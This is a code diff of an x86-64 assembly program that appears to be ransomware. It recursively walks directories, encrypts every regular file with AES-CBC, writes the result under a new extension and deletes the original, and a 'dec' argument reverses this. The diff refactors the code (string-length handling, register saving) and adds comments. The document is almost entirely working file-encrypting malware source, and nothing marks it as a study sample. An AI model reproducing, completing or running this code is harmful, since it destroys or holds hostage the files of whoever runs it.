@@ -5,6 +5,7 @@
 extern printf
 extern strcmp
 extern strcat
+extern strlen
 extern strncpy
 extern sprintf
 extern malloc
@@ -17,9 +18,6 @@ DIRENT_BUFF_SZ        equ 4096
 
 OP_ENC                equ 0x00
 OP_DEC                equ 0x01
-
-; TODO
-;       FREE ALLOCATED MEMORY
 
 section .data
         openfile_error          db "Failed to open file",0xa,0x00
@@ -48,6 +46,7 @@ section .data
         op                      db OP_ENC          ;encrypt = 0x00 or decrypt = 0x01
         decStrArg               db "dec", 0x00   ; argument used to decrypt files
 
+        ; function pointer used to encrypt or decrypt
         opFunction              dq AES_CBC_encrypt_buffer
 
         
@@ -66,13 +65,14 @@ global    main
 
 section   .text
 main:
+    mov rbp, rsp; for correct debugging
         push    rbp
         mov     rbp, rsp
         
         cmp     rdi, 0x01
         je      _start_op
 
-        ; check if should enc/decpryt
+        ; check if should encrypt or decrypt files
         mov     rdi, [rsi + 0x08]
         mov     rsi, decStrArg
         call    strcmp
@@ -80,7 +80,6 @@ main:
         cmp     rax, 0x00
         jne     _start_op
 
-_Dec:
         mov     BYTE[op], OP_DEC
         mov     QWORD[opFunction], AES_CBC_decrypt_buffer
         mov     QWORD[renameFunction], original_filename
@@ -105,6 +104,13 @@ get_dir_files_rec:
         push    rbp
         mov     rbp, rsp
         sub     rsp, 0x38
+
+        push    rsi
+        push    rdi
+        push    rax
+        push    rbx
+        push    rcx
+        push    r15
 
         ; allocate memory for dirents structs
         mov     rdi, DIRENT_BUFF_SZ
@@ -146,13 +152,13 @@ read_next_dirent:
         lea     rsi, [rbx + DirEnt.d_name]
 
         
-        ; check for ".." 
+        ; ignore ".." 
         mov     rdi, dotdotDir
         call    strcmp
         cmp     rax, 0x00
         je      _next_offset
 
-        ; check for "."
+        ; ignore "."
         mov     rdi, dotDir
         call    strcmp
         cmp     rax, 0x00
@@ -169,24 +175,11 @@ read_next_dirent:
         cmp     BYTE[rbx + DirEnt.d_type], DT_REG
         je      _read_next_file
 
-        push    rsi
-        push    rdi
-        push    rax
-        push    rbx
-        push    rcx
-        push    r15
+      
 
         push    QWORD [rbp - filePath]
         call    get_dir_files_rec
         pop     r10
-
-        pop     r15
-        pop     rcx
-        pop     rbx
-        pop     rax
-        pop     rdi
-        pop     rsi
-
 
         jmp     _next_offset
 
@@ -214,6 +207,7 @@ _read_next_file:
         call    printf
 
         pop     rax
+
         ; create new file
         push    rax
         call    create_file
@@ -234,6 +228,8 @@ _read_next_file:
 
 _read_loop:
 
+        ; here we subtract 0x10(AES128 block size) from BUFF_SZ so we have enough space
+        ; for padding when encrypting
         push    BUFF_SZ - 0x10
         push    fileBuffer
         push    QWORD[file_fd]
@@ -247,8 +243,10 @@ _read_loop:
         cmp     byte[op], OP_DEC
         je      _write_copy
 
+        ; PKCS7 padding
+
         ; check if its a multiple of 16
-        ; same as r9 % 16
+        ; same as r9 % 16 == 0
         mov     r9, rax
         and     r9, 0xF
 
@@ -263,6 +261,7 @@ _read_loop:
         add     rax, r9
         push    rax
 
+        ; how many bytes were appended
         mov     rsi, r9
         mov     rdx, r9
         call    memset
@@ -285,7 +284,8 @@ _write_copy:
 
         pop     rax
         push    rax
-        ; encrypt data
+        
+        ; encrypt or decrypt data
         mov     rdi, aesCtx
         mov     rsi, fileBuffer
         mov     rdx, rax
@@ -302,8 +302,8 @@ _write_copy:
         sub     rax, rcx
         
 _write_data:
-        push    rax
-        push    fileBuffer      ; buffer
+        push    rax                             ; buffer size
+        push    fileBuffer                      ; buffer
         push    QWORD[file_copy_fd]             ; new file fd
         call    write_file
 
@@ -315,6 +315,7 @@ _close_files:
         push    QWORD[file_fd]
         call    close_file
 
+        ; delete original file
         push    QWORD[rbp - filePath]
         call    delete_file
 
@@ -342,7 +343,12 @@ _ret_get_dir_files:
         mov     rdi, QWORD[rbp - bufferPtr]
         call    free
 
-
+        pop     r15
+        pop     rcx
+        pop     rbx
+        pop     rax
+        pop     rdi
+        pop     rsi
 
         leave
         ret
@@ -367,7 +373,7 @@ readfile_failed:
         jmp     exit_0
 
 exit_0:
-        mov     rax, 60                 ; system call for exit
+        mov     rax, 0x3c                 ; system call for exit
         xor     rdi, rdi                ; exit code 0
         syscall                           ; invoke operating system to exit
 
@@ -387,38 +393,7 @@ write_stdout:
 
         
 
-;strlen function
-__strlen:
-    push        rbp
-    mov         rbp, rsp
-
-
-    push    rsi
-    push    rcx
-    push    rdi
-
-    ;rdi str
-    xor rcx, rcx                        ;set rcx to 0, will be used to count
-    mov rsi, [rbp + 0x10]
-
-_count:
-    lodsb
-    cmp al,0x00
-    je _doneStrLen
-    inc rcx
-    jmp _count
-
-
-_doneStrLen:
-    mov rax, rcx
-
-    pop rdi
-    pop rcx
-    pop rsi
-    
-    leave                                       ;destroy stackframe
-    ret
-
+; append extention to encrypted filename
 append_ext:
         push    rbp
         mov     rbp, rsp
@@ -431,8 +406,8 @@ append_ext:
         push    rsi
 
         ; get the size of the filename
-        push    QWORD[rbp + 0x10]               ; original filename
-        call    __strlen
+        mov     rdi, QWORD[rbp + 0x10]               ; original filename
+        call    strlen
 
         cmp     rax, 0x00
         je      _append_done
@@ -473,13 +448,13 @@ _append_done:
         ret
 
 
-
+; get the original file name by removing the extension
 original_filename:
         push    rbp
         mov     rbp, rsp
         
-        push    QWORD[rbp + 0x10]
-        call    __strlen
+        mov     rdi, QWORD[rbp + 0x10]
+        call    strlen
 
         cmp     rax, 0x00
         je      _ret_original_filename
